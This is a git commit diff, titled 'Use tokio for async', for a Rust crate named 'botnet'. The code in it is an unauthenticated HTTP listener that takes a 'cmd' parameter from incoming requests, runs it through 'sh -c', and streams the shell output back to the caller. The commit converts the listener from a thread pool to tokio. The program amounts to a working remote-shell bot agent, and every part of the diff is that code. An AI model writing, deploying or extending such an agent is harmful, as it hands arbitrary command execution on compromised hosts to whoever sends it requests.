2e09c6d4a6805f05bf22ba007b215dd2c327c6c9
Vzaa <Vzaa@users.noreply.github.com>
2019-11-27 11:20:40 +0300

    Use tokio for async

--- src/main.rs
+++ src/main.rs
@@ -1,28 +1,29 @@
 use std::env;
-use std::io::prelude::*;
-use std::io::Read;
-use std::net::{TcpListener, TcpStream};
-use std::process::{Command, Stdio};
-use std::time::Duration;
+use std::error::Error;
+use std::process::Stdio;
 
-use botnet::ThreadPool;
+use tokio;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::{TcpListener, TcpStream};
+use tokio::process::Command;
 
-fn main() {
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn Error>> {
     let addr = env::args()
         .nth(1)
         .unwrap_or_else(|| "127.0.0.1:7878".to_owned());
-    let listener = TcpListener::bind(&addr).unwrap();
-    let pool = ThreadPool::new(4);
-
-    for stream in listener.incoming() {
-        let stream = stream.unwrap();
-
-        pool.execute(|| {
-            handle_connection(stream);
-        });
+    let mut listener = TcpListener::bind(&addr).await?;
+    loop {
+        if let Ok((socket, _)) = listener.accept().await {
+            tokio::spawn(async move {
+                handle_connection(socket).await;
+            });
+        } else {
+            break;
+        }
     }
-
     eprintln!("Shutting down.");
+    Ok(())
 }
 
 fn ascii_to_num(a: u8) -> Option<u8> {
@@ -79,15 +80,15 @@ fn get_cmd(buf: &[u8]) -> Option<&[u8]> {
     vars.find(|(k, _)| k == &Some(b"cmd".as_ref()))?.1
 }
 
-fn handle_connection(mut stream: TcpStream) -> Option<()> {
+async fn handle_connection(mut stream: TcpStream) -> Option<()> {
     let mut in_buffer = [0; 1024];
     let mut out_buffer = [0; 1024];
     let mut bytes = 0;
-    stream.set_read_timeout(Some(Duration::new(5, 0))).ok()?;
+    //stream.set_read_timeout(Some(Duration::new(5, 0))).ok()?;
 
     loop {
         let buf = &mut in_buffer[bytes..];
-        let len = stream.read(buf).ok()?;
+        let len = stream.read(buf).await.ok()?;
 
         if len == 0 {
             eprintln!("Buffer filled or connection closed");
@@ -104,8 +105,8 @@ fn handle_connection(mut stream: TcpStream) -> Option<()> {
         c
     } else {
         let status_404 = b"HTTP/1.1 404 NOT FOUND\r\nContent-Length: 5\r\n\r\nError";
-        stream.write(status_404).ok()?;
-        stream.flush().ok()?;
+        stream.write(status_404).await.ok()?;
+        stream.flush().await.ok()?;
         return None;
     };
 
@@ -113,7 +114,7 @@ fn handle_connection(mut stream: TcpStream) -> Option<()> {
 
     eprintln!("Run: '{}'", cmd);
 
-    let child = Command::new("sh")
+    let mut child = Command::new("sh")
         .arg("-c")
         .arg(cmd)
         .stdout(Stdio::piped())
@@ -121,7 +122,7 @@ fn handle_connection(mut stream: TcpStream) -> Option<()> {
         .spawn()
         .ok()?;
 
-    let mut stdout = child.stdout?;
+    let mut stdout = child.stdout().take()?;
 
     let headers: [&[u8]; 3] = [
         b"HTTP/1.1 200 OK\r\n",
@@ -130,22 +131,29 @@ fn handle_connection(mut stream: TcpStream) -> Option<()> {
     ];
 
     for h in &headers {
-        stream.write(h).ok()?;
+        stream.write(h).await.ok()?;
     }
 
     loop {
-        let len = stdout.read(&mut out_buffer).ok()?;
+        let len = stdout.read(&mut out_buffer).await.ok()?;
         if len == 0 {
             break;
         }
-        stream.write(format!("{:x}\r\n", len).as_bytes()).ok()?;
-        stream.write(&out_buffer[0..len]).ok()?;
-        stream.write(b"\r\n").ok()?;
-        stream.flush().ok()?;
+        let tmp_str = format!("{:x}\r\n", len);
+        stream.write(tmp_str.as_bytes()).await.ok()?;
+        // Is this a bug somewhere?
+        //stream
+        //.write(format!("{:x}\r\n", len).as_bytes())
+        //.await
+        //.ok()?;
+        //
+        stream.write(&out_buffer[0..len]).await.ok()?;
+        stream.write(b"\r\n").await.ok()?;
+        stream.flush().await.ok()?;
     }
 
-    stream.write(b"0\r\n\r\n").ok()?;
-    stream.flush().ok()?;
+    stream.write(b"0\r\n\r\n").await.ok()?;
+    stream.flush().await.ok()?;
 
     Some(())
 }
